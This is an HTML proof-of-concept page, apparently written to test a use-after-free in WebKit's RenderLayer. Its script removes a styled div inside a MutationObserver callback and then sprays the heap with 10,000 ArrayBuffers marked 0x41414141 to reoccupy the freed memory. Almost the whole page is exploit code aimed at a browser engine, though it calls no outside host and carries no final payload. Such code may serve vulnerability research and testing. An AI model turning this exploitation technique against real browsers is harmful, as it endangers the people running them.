<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>UAF Test - WebKit RenderLayer</title>
  <style>
    #victim {
      width: 100px;
      height: 100px;
      background: red;
      content-visibility: auto;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <div id="container"></div>

  <script>
    function log(msg) {
      const el = document.createElement("pre");
      el.textContent = msg;
      document.body.appendChild(el);
    }

    function sprayHeap() {
      let spray = [];
      for (let i = 0; i < 10000; i++) {
        let ab = new ArrayBuffer(0x1000);
        let dv = new DataView(ab);
        dv.setUint32(0, 0x41414141, true);
        spray.push(ab);
      }
      log("Heap sprayed");
      return spray;
    }

    function triggerUAF() {
      let div = document.createElement("div");
      div.id = "victim";
      document.getElementById("container").appendChild(div);

      let inner = document.createElement("div");
      div.appendChild(inner);

      let mo = new MutationObserver(() => {
        document.getElementById("container").removeChild(div);
        sprayHeap(); // Intentamos ocupar la memoria liberada
        log("Possible UAF triggered");
      });

      mo.observe(div, { childList: true });

      // Provoca el cambio de visibilidad y truncamiento
      div.style.contentVisibility = "visible";
      inner.textContent = "This is a test of the emergency broadcast system.";
    }

    window.onload = () => {
      log("Starting UAF test...");
      setTimeout(triggerUAF, 100);
    };
  </script>
</body>
</html>
